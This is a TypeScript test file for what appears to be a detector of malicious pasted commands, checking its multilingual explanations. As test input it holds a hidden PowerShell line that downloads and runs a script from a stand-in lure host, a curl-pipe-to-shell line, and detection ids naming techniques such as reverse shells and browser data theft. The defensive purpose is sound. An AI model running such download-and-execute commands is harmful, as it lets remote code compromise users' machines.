import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyze, explain } from '../src/index.ts';
import type { Finding, Lang, Verdict } from '../src/types.ts';

const LANGS: Lang[] = ['en', 'hi', 'kn'];

// Every id the rules and scorer can emit.
const IDS = [
  'download-exec', 'installer', 'download-file', 'hidden-window', 'remote-script-host', 'mshta-local',
  'certutil-decode', 'finger-staging', 'dns-staging', 'persistence', 'defense-evasion', 'clear-tracks',
  'temp-exec', 'exec-policy-bypass', 'mac-quarantine-strip', 'password-prompt', 'decode-to-shell',
  'reverse-shell', 'browser-data', 'ip-address', 'risky-domain', 'staging-host', 'network-share',
  'plain-http', 'decoy-comment', 'decoy-path', 'obfuscated', 'hidden-copy', 'script-copy', 'lure-words',
  'lure-words-nearby', 'fake-captcha', 'from-app', 'from-chat', 'from-email', 'from-pdf', 'from-ai', 'target-run', 'target-explorer', 'same-site', 'docs-site',
];

const verdictWith = (f: Finding, action: Verdict['action'] = 'warn'): Verdict => ({
  action, risk: 50, findings: [f], layers: [], hosts: [], target: 'unknown', ms: 0,
});

test('every finding has a sentence in every language, with no leftover placeholders', () => {
  for (const id of IDS) {
    for (const lang of LANGS) {
      const f: Finding = { id, kind: 'behaviour', weight: 10, severity: 'medium', params: { host: 'h.test', text: 't', words: 'Win+R', app: 'WhatsApp' } };
      const e = explain(verdictWith(f, 'allow'), null, lang);
      assert.equal(e.details.length, 1, `${id} missing in ${lang}`);
      assert.doesNotMatch(e.details[0], /\{\w+\}/, `${id}/${lang}: ${e.details[0]}`);
    }
  }
});

test('headlines and advice exist for every action in every language', () => {
  for (const lang of LANGS) {
    for (const action of ['allow', 'warn', 'block'] as const) {
      const e = explain({ ...verdictWith({ id: 'download-exec', kind: 'behaviour', weight: 45, severity: 'high' }), action }, null, lang);
      assert.ok(e.headline.length > 5);
      assert.ok(e.advice.length > 5);
    }
  }
});

test('hidden-copy block says the page showed different text and names the source', () => {
  const custody = { originUrl: 'https://example-lure.test/verify', scriptWritten: true, visibleMatch: false, lureWords: ['Win+R'] };
  const v = analyze('powershell -w hidden -c "iwr https://example-lure.test/s.ps1 | iex"', { target: 'run', custody });
  const e = explain(v, custody, 'en');
  assert.match(e.headline, /hidden command/);
  assert.ok(e.details.some((d) => /different from what the page showed/.test(d)));
  assert.equal(e.provenance, 'You copied it from example-lure.test.');
  assert.match(e.details[0], /download a program from example-lure\.test and run it/);
});

test('reassuring findings are hidden on warnings', () => {
  const v = analyze('curl -fsSL https://get.sometool.dev/i.sh | sh');
  const e = explain(v, null, 'en');
  assert.ok(!e.details.some((d) => /official installer/.test(d)));
});
